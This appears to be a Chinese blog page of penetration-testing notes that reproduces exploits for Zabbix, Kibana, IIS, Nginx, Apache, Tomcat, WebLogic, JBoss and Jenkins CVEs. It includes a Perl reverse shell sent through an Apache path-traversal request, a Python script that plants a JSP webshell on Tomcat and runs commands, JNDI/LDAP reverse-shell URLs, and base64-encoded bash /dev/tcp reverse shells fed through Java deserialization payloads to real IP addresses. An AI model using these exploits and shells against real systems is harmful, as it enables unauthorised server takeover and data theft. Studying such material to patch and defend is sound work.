class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Zabbix-CVE-2022-23131"><a href="#Zabbix-CVE-2022-23131" class="headerlink" title="Zabbix-CVE-2022-23131"></a>Zabbix-CVE-2022-23131</h3><h5 id="一、漏洞描述-1"><a href="#一、漏洞描述-1" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。默认端口：10051</span><br><span class="line">Zabbix CVE-2022-23131 登录绕过漏洞复现</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-未授权登录配合RCE"><a href="#二、漏洞复现-未授权登录配合RCE" class="headerlink" title="二、漏洞复现-未授权登录配合RCE"></a>二、漏洞复现-未授权登录配合RCE</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722214656142.png" alt="image-20230722214656142"></p>
<p>替换COOKIE 绕过登录 </p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722214732336.png" alt="image-20230722214732336"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722214318202.png" alt="image-20230722214318202"></p>
<p>添加任务</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722214451620.png" alt="image-20230722214451620"></p>
<p>执行任务</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722214536662.png" alt="image-20230722214536662"></p>
<p>getshell</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722214554997.png" alt="image-20230722214554997"></p>
<h3 id="kibana-CVE-2019-7609"><a href="#kibana-CVE-2019-7609" class="headerlink" title="kibana-CVE-2019-7609"></a>kibana-CVE-2019-7609</h3><h5 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kibana为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-8"><a href="#二、漏洞复现-8" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><ul>
<li><p>批量检测小tips</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230722232545277.png" alt="image-20230722232545277"></p>
</li>
</ul>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230723003546536.png" alt="image-20230723003546536"></p>
<h2 id="中间件安全"><a href="#中间件安全" class="headerlink" title="中间件安全"></a>中间件安全</h2><h3 id="IIS-短文件-解析-蓝屏"><a href="#IIS-短文件-解析-蓝屏" class="headerlink" title="IIS-短文件&amp;解析&amp;蓝屏"></a>IIS-短文件&amp;解析&amp;蓝屏</h3><h5 id="一、漏洞描述-2"><a href="#一、漏洞描述-2" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h5><ul>
<li><p>短文件</p>
<p>一、漏洞来由：</p>
<p>此漏洞实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（〜）波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称（不应该可被访问）。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230723211531713.png" alt="image-20230723211531713"></p>
</li>
<li><p>文件解析</p>
<p>IIS 6.x 解析漏洞<br>（1） 该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析;号及其后面的内容，相当于截断。</p>
<p>（2）该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。</p>
<p>修复：微软认为这不是一个漏洞，所以要自己修复。</p>
<p>限制上传目录执行权限，不允许执行脚本。<br>不允许新建目录。<br>上传的文件经过重命名<br>（3）llS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp,<br>——————————————————————————————</p>
<p>IIS 7.x 解析漏洞</p>
<p>（1）在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为 php 文件。</p>
<p>上传<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=phpinfo&spm=1001.2101.3001.7020">phpinfo</a>的文件，命名为test.png，正常情况下不解析。但在后面加 &#x2F;.php ，就可以以php格式运行。</p>
<p>——————————————————————————————</p>
</li>
<li><p>HTTP.SYS 蓝屏崩溃</p>
<p>没屌用</p>
</li>
<li><p>CVE-2017-7269 条件过老</p>
</li>
</ul>
<h5 id="二、漏洞复现-9"><a href="#二、漏洞复现-9" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><h3 id="Nginx-文件解析-命令执行等"><a href="#Nginx-文件解析-命令执行等" class="headerlink" title="Nginx-文件解析&amp;命令执行等"></a>Nginx-文件解析&amp;命令执行等</h3><h5 id="一、漏洞描述-3"><a href="#一、漏洞描述-3" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h5><ul>
<li><p>文件解析</p>
<p>该漏洞与nginx、php版本无关，属于用户配置不当造成的解析漏洞。由于nginx.conf的如下配置导致nginx把以’.php’结尾的文件交给fastcgi处理,对于任意文件名，在后面添加&#x2F;xxx.php（xxx）为任意字符后，即可将文件作为php解析。</p>
</li>
<li><p>CVE-2013-4547</p>
<p>影响版本</p>
<p>Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7</p>
<p>非法字符空格和截止符（\0）会导致Nginx解析URI时的有限状态机混乱，此漏洞可导致目录跨越及代码执行</p>
<p>受影响版本</p>
</li>
</ul>
<h5 id="二、漏洞复现-10"><a href="#二、漏洞复现-10" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><ul>
<li>CVE-2013-4547</li>
</ul>
<h3 id="Apache-RCE-目录遍历-文件解析"><a href="#Apache-RCE-目录遍历-文件解析" class="headerlink" title="Apache-RCE&amp;目录遍历&amp;文件解析"></a>Apache-RCE&amp;目录遍历&amp;文件解析</h3><h5 id="一、漏洞描述-4"><a href="#一、漏洞描述-4" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-11"><a href="#二、漏洞复现-11" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><ul>
<li><p>cve_2021_42013 RCE</p>
<p>影响版本： Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh </span><br><span class="line">echo;perl -e &#x27;use Socket;$i=&quot;47.94.236.117&quot;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​		<img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230723230949603.png" alt="image-20230723230949603"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230723232050663.png" alt="image-20230723232050663"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230723231221448.png" alt="image-20230723231221448"></p>
<ul>
<li><p>cve_2021_41773 目录穿越</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cve_2021_41773 目录穿越</span><br><span class="line">Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</span><br><span class="line">Burp：/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p>cve-2017-15715 文件解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache HTTPD是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Tomcat-弱口令-文件上传-文件包含等"><a href="#Tomcat-弱口令-文件上传-文件包含等" class="headerlink" title="Tomcat-弱口令&amp;文件上传&amp;文件包含等"></a>Tomcat-弱口令&amp;文件上传&amp;文件包含等</h3><h5 id="一、漏洞描述-5"><a href="#一、漏洞描述-5" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1、弱口令猜解</span><br><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</span><br><span class="line">2、CVE-2017-12615 文件上传</span><br><span class="line">当存在漏洞的Tomcat运行在Windows/Linux主机上， 且启用了HTTP PUT请求方法（ 例如， 将readonly初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</span><br><span class="line">影响版本:Apache Tomcat 7.0.0 - 7.0.79</span><br><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">shell代码</span><br><span class="line">3、cve_2020_1938 文件包含</span><br><span class="line">Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</span><br><span class="line">漏洞影响的产品版本包括：</span><br><span class="line">Tomcat 6.*</span><br><span class="line">Tomcat 7.* &lt; 7.0.100</span><br><span class="line">Tomcat 8.* &lt; 8.5.51</span><br><span class="line">Tomcat 9.* &lt; 9.0.31</span><br><span class="line">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76 -p 63667 -f WEB-INF/web.xml</span><br><span class="line">4、cve_2020_11996 拒绝服务</span><br><span class="line">危害过大，权限无关，意义不大</span><br><span class="line">5、cve_2020_9484 反序列化</span><br><span class="line">利用条件太苛刻，意义不大</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-12"><a href="#二、漏洞复现-12" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><ul>
<li><p>文件上传</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230726155024631.png" alt="image-20230726155024631"></p>
</li>
</ul>
<p>​		exp利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#CVE-2017-12615 EXP</span></span><br><span class="line">__author__ = <span class="string">&#x27;纸机&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">parse = optparse.OptionParser(usage = <span class="string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)</span><br><span class="line">parse.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,dest=<span class="string">&#x27;URL&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>)</span><br><span class="line">parse.add_option(<span class="string">&#x27;-p&#x27;</span>,<span class="string">&#x27;--port&#x27;</span>,dest=<span class="string">&#x27;PORT&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="string">&#x27;8080&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">options,args = parse.parse_args()</span><br><span class="line"><span class="comment">#验证参数是否完整</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> options.URL <span class="keyword">or</span> <span class="keyword">not</span> options.PORT:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)</span><br><span class="line">        exit(<span class="string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">url = options.URL+<span class="string">&#x27;:&#x27;</span>+options.PORT</span><br><span class="line">filename = <span class="string">&#x27;/backdoor.jsp&#x27;</span></span><br><span class="line">payload = filename+<span class="string">&#x27;?pwd=023&amp;i=&#x27;</span></span><br><span class="line"> </span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;</span><br><span class="line"><span class="comment">#木马</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&lt;%</span></span><br><span class="line"><span class="string">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span></span><br><span class="line"><span class="string">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span></span><br><span class="line"><span class="string">        int a = -1;</span></span><br><span class="line"><span class="string">        byte[] b = new byte[2048];</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="string">        while((a=in.read(b))!=-1)&#123;</span></span><br><span class="line"><span class="string">            out.println(new String(b));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        out.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#上传木马文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[*] 目标地址:&#x27;</span>+url)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    respond = requests.put(url+filename+<span class="string">&#x27;/&#x27;</span>,headers=headers,data = data)</span><br><span class="line">    <span class="comment">#print(respond.status_code)</span></span><br><span class="line">    <span class="keyword">if</span> respond.status_code == <span class="number">201</span> <span class="keyword">or</span> respond.status_code == <span class="number">204</span>:</span><br><span class="line">      <span class="comment">#print(&#x27;[*] 目标地址:&#x27;+url)</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;[+] 木马上传成功&#x27;</span>)</span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] 上传失败&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">url,cmd</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    respond = requests.get(url+payload+cmd)</span><br><span class="line">    <span class="keyword">if</span> respond.status_code == <span class="number">200</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">str</span>(respond.text).replace(<span class="string">&quot;&lt;pre&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/pre&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).strip())</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] 命令执行错误&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> upload(url) == <span class="number">0</span>:</span><br><span class="line">        exit()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;输入执行命令(quit退出):&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">  cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span>(cmd == <span class="string">&#x27;quit&#x27;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  attack(url,cmd)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230726155336745.png" alt="image-20230726155336745"></p>
<ul>
<li><p>文件包含</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230726160514194.png" alt="image-20230726160514194"></p>
</li>
</ul>
<h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">探针默认端口：7001，Weblogic是Oracle公司推出的J2EE应用服务器</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server是美国甲骨文（Oracle）公司的一款适用于云环境和传统环境的应用服务中间件，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。</span><br></pre></td></tr></table></figure>

<p><code>如果访问/wls-wsat/CoordinatorPortType11 /wls-wsat/CoordinatorPortType /wls-wsat/CoordinatorPortType11目录，存在下图则说明或许存在漏洞</code></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230727120344653.png" alt="image-20230727120344653"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">影响范围</span><br><span class="line">OracleWebLogic Server10.3.6.0.0</span><br><span class="line"></span><br><span class="line">OracleWebLogic Server12.1.3.0.0</span><br><span class="line"></span><br><span class="line">OracleWebLogic Server12.2.1.1.0</span><br><span class="line"></span><br><span class="line">OracleWebLogic Server12.2.1.2.0</span><br></pre></td></tr></table></figure>

<p>漏洞利用</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/新建文件夹\笔记\渗透测试\image-20230727121010051.png" alt="image-20230727121010051"></p>
<h5 id="cve-2018-2893"><a href="#cve-2018-2893" class="headerlink" title="cve_2018_2893"></a>cve_2018_2893</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebLogic Server使用T3协议在WebLogic Server和客户端间传输数据和通信，由于WebLogic的T3协议和Web协议使用相同的端口，导致在默认情况下，WebLogic Server T3协议通信和Web端具有相同的访问权限。 易受攻击的WebLogic服务允许未经身份验证的攻击者通过T3网络访问及破坏Oracle WebLogic Server。此漏洞的成功攻击可能导致攻击者接管Oracle WebLogic Server，造成远程代码执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="cve-2020-14882"><a href="#cve-2020-14882" class="headerlink" title="cve_2020_14882"></a>cve_2020_14882</h5><p>访问<code>http://your-ip:7001/console</code>即可查看到后台登录页面</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230727155001080.png" alt="image-20230727155001080"></p>
<p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230727155149150.png" alt="image-20230727155149150"></p>
<p>梭哈~</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230727155727231.png" alt="image-20230727155727231"></p>
<h5 id="cve-2023-21839"><a href="#cve-2023-21839" class="headerlink" title="cve_2023-21839"></a>cve_2023-21839</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2023-21839允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致RCE漏洞。</span><br></pre></td></tr></table></figure>

<p>影响版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 12.2.1.3.0</span><br><span class="line">Weblogic 12.2.1.4.0</span><br><span class="line">Weblogic 14.1.1.0.0</span><br></pre></td></tr></table></figure>

<p>漏洞复现</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/新建文件夹\笔记\渗透测试\image-20230727165954798.png" alt="image-20230727165954798"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldap://43.139.157.254:1389/Basic/ReverseShell/43.139.157.254/9988</span><br><span class="line"></span><br><span class="line">ldap://43.139.157.254:1389/evil</span><br><span class="line">ldap://43.139.157.254:1389/Basic/ReverseShell/43.139.157.254/9988</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230727213146743.png" alt="image-20230727213146743"></p>
<h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><p>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。</p>
<h5 id="CVE-2017-12149"><a href="#CVE-2017-12149" class="headerlink" title="CVE-2017-12149"></a>CVE-2017-12149</h5><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/新建文件夹\笔记\渗透测试\1.webp" alt="1"></p>
<p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230727223406966.png" alt="image-20230727223406966"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU3LjI1NC82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br><span class="line"></span><br><span class="line">curl http://123.58.224.8:64621/jbossmq-httpil/HTTPServerILServlet --data-binary @poc.ser</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230727223752201.png" alt="image-20230727223752201"></p>
<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">探针默认端口：8080，Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作。</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2017-1000353"><a href="#CVE-2017-1000353" class="headerlink" title="CVE-2017-1000353"></a>CVE-2017-1000353</h5><p>漏洞复现</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230729182700194.png" alt="image-20230729182700194"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/43.139.157.254/6666 0&gt;&amp;1</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU3LjI1NC82NjY2IDA+JjE=</span><br><span class="line">jdk-8u291</span><br><span class="line">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU3LjI1NC82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230729185059152.png" alt="image-20230729185059152"></p>
<h5 id="CVE-2018-1000861"><a href="#CVE-2018-1000861" class="headerlink" title="CVE-2018-1000861"></a>CVE-2018-1000861</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230729191436316.png" alt="image-20230729191436316"></p>
